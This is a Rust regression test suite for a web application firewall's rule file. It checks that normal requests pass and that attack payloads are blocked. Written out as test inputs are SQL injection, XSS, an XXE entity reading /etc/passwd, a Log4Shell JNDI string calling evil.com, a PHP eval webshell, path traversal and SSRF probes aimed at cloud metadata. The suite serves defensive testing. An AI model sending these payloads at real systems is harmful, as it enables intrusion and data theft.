//! rules/rules.toml 规则集回归测试。
//!
//! 直接加载仓库里的真实规则文件构建引擎，验证三件事：
//! * 规则文件能解析、所有正则能编译（防止“加了一条语法错误规则把服务搞挂”）；
//! * 新增/既有规则对代表性攻击载荷按预期拦截；
//! * 正常流量（普通 URL、curl UA、大 body 纯文本、含 SQL 关键字的 JSON）
//!   零误杀；弱信号单命中（15 分 < 阈值 20）不拦截，体现打分制组合设计。

use hyper::Method;
use rustgate::config::Config;
use rustgate::engine::{Engine, NormalizedRequest, Verdict};

/// 加载仓库内真实规则文件并构建引擎（同时验证解析 + 正则编译成功）。
fn engine() -> Engine {
    let cfg = Config::load("rules/rules.toml").expect("rules.toml 应能解析");
    Engine::new(cfg).expect("规则引擎应构建成功（所有正则可编译）")
}

fn inspect_full(method: &Method, uri: &str, ua: Option<&str>, body: &str) -> Verdict {
    let mut headers = hyper::HeaderMap::new();
    if let Some(ua) = ua {
        headers.insert("user-agent", ua.parse().unwrap());
    }
    let req = NormalizedRequest::from_parts(method, &uri.parse().unwrap(), &headers, body);
    engine().inspect(&req)
}

fn inspect_get(uri: &str, ua: Option<&str>, body: &str) -> Verdict {
    inspect_full(&Method::GET, uri, ua, body)
}

fn assert_blocked(desc: &str, v: &Verdict) {
    match v {
        Verdict::Block { .. } => {}
        Verdict::Allow => panic!("{desc} 应被拦截，实际放行"),
    }
}

fn assert_allowed(desc: &str, v: &Verdict) {
    match v {
        Verdict::Allow => {}
        Verdict::Block { .. } => panic!("{desc} 应放行，实际被拦截"),
    }
}

// ---------- 正常流量：零误杀 ----------

#[test]
fn ruleset_loads_successfully() {
    let _ = engine();
}

#[test]
fn ruleset_has_body_and_header_rules_enabled() {
    // 规则集含 Body 与 Header 规则 → 引擎必须启用对应构建路径（防 needs_* 恒 false 变异）
    let e = engine();
    assert!(e.needs_body(), "规则集含 Body 规则，needs_body 应为 true");
    assert!(
        e.needs_headers(),
        "规则集含 Header 规则，needs_headers 应为 true"
    );
}

#[test]
fn normal_index_page_allowed() {
    // 对应 QA「正常请求放行」：curl UA + /index.html
    let v = &inspect_get("/index.html", Some("curl/8.5.0"), "");
    assert_allowed("/index.html", v);
}

#[test]
fn normal_query_allowed() {
    let v = &inspect_get("/search?q=hello+world&page=2", Some("Mozilla/5.0"), "");
    assert_allowed("普通搜索请求", v);
}

#[test]
fn json_body_containing_sql_keyword_allowed() {
    // JSON 正文里出现 select/from 等关键词是正常业务，不能误杀
    let body = r#"{"query":"select * from users where active=true"}"#;
    let v = &inspect_get("/api/search", None, body);
    assert_allowed("含 select 关键词的 JSON", v);
}

#[test]
fn large_plain_body_allowed() {
    // 对应 QA「大body跨帧流式(300KB)」：纯文本大 body 不误杀
    let v = &inspect_get("/", None, &"a".repeat(300_000));
    assert_allowed("300KB 纯文本 body", v);
}

#[test]
fn weak_signal_single_hit_is_allowed() {
    // 弱信号（15 分 < 阈值 20）单命中不拦截，需组合
    let v = &inspect_get("/backup.sql", Some("curl/8.5.0"), "");
    assert_allowed("/backup.sql（单弱信号）", v);

    let v = &inspect_get("/wp-login.php", Some("curl/8.5.0"), "");
    assert_allowed("/wp-login.php（单弱信号）", v);
}

// ---------- SQL 注入 ----------

#[test]
fn sqli_union_select_query_blocked() {
    assert_blocked("union select", &inspect_get("/?q=1+union+select", None, ""));
    assert_blocked(
        "UNION SELECT 大写",
        &inspect_get("/?q=1+UNION+SELECT", None, ""),
    );
}

#[test]
fn sqli_union_select_body_blocked() {
    assert_blocked(
        "body 里的 union select",
        &inspect_get("/", None, "1 union select password from users"),
    );
}

#[test]
fn sqli_comment_obfuscation_blocked() {
    // union/**/select 绕过字面量 "union select"，由正则规则兜底
    assert_blocked(
        "注释混淆 union/**/select",
        &inspect_get("/?q=1+union/**/select", None, ""),
    );
}

#[test]
fn sqli_time_based_blocked() {
    assert_blocked(
        "时间盲注 sleep()",
        &inspect_get("/?q=1+and+sleep(5)", None, ""),
    );
}

// ---------- XSS ----------

#[test]
fn xss_script_in_query_blocked() {
    // 原始 < 在 URI 里非法，用 %3C 编码；解码后应命中
    assert_blocked(
        "query 里 <script>",
        &inspect_get("/?q=%3Cscript%3Ealert(1)%3C/script%3E", None, ""),
    );
}

#[test]
fn xss_javascript_uri_blocked() {
    assert_blocked(
        "javascript: 伪协议",
        &inspect_get("/?next=javascript:alert(1)", None, ""),
    );
}

// ---------- XXE ----------

#[test]
fn xxe_external_entity_blocked() {
    let body = r#"<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]><foo>&xxe;</foo>"#;
    assert_blocked("XXE 外部实体", &inspect_get("/", None, body));
}

// ---------- RCE / SSTI / 反序列化 ----------

#[test]
fn log4shell_query_blocked() {
    assert_blocked(
        "${jndi: 注入",
        &inspect_get("/?q=${jndi:ldap://evil.com/a}", None, ""),
    );
}

#[test]
fn log4shell_header_blocked() {
    // JNDI 载荷放在 User-Agent 等任意 header
    assert_blocked(
        "header 里的 ${jndi:",
        &inspect_get("/", Some("${jndi:ldap://x}"), ""),
    );
}

#[test]
fn ssti_probes_blocked() {
    assert_blocked("{{7*7}}", &inspect_get("/?tpl={{7*7}}", None, ""));
    assert_blocked("${7*7}", &inspect_get("/?tpl=${7*7}", None, ""));
}

#[test]
fn php_webshell_blocked() {
    assert_blocked(
        "PHP webshell",
        &inspect_get("/", None, "<?php eval($_POST['cmd']); ?>"),
    );
}

#[test]
fn java_deserialization_blocked() {
    assert_blocked("rO0AB 魔术头", &inspect_get("/", None, "rO0ABXNyAB...")); // base64(0xac ed 00 05)
}

// ---------- LFI / 信息泄露 ----------

#[test]
fn traversal_etc_passwd_blocked() {
    assert_blocked("路径穿越", &inspect_get("/../../etc/passwd", None, ""));
}

#[test]
fn env_file_probe_blocked() {
    assert_blocked("/.env", &inspect_get("/.env", Some("curl/8.5.0"), ""));
}

#[test]
fn git_dir_probe_blocked() {
    assert_blocked("/.git/config", &inspect_get("/.git/config", None, ""));
}

// ---------- SSRF ----------

#[test]
fn ssrf_metadata_blocked() {
    assert_blocked(
        "云元数据 169.254.169.254",
        &inspect_get("/?url=http://169.254.169.254/latest/meta-data/", None, ""),
    );
}

#[test]
fn ssrf_localhost_blocked() {
    assert_blocked(
        "http://127.0.0.1",
        &inspect_get("/?url=http://127.0.0.1:8080/admin", None, ""),
    );
}

// ---------- 扫描器识别 ----------

#[test]
fn scanner_ua_blocked() {
    assert_blocked("sqlmap UA", &inspect_get("/", Some("sqlmap/1.7.8"), ""));
    assert_blocked("nikto UA", &inspect_get("/", Some("Nikto/2.5.0"), ""));
}

// ---------- HTTP 方法滥用 ----------

#[test]
fn trace_method_blocked() {
    assert_blocked("TRACE 方法", &inspect_full(&Method::TRACE, "/", None, ""));
    assert_blocked(
        "CONNECT 方法",
        &inspect_full(&Method::CONNECT, "/", None, ""),
    );
}
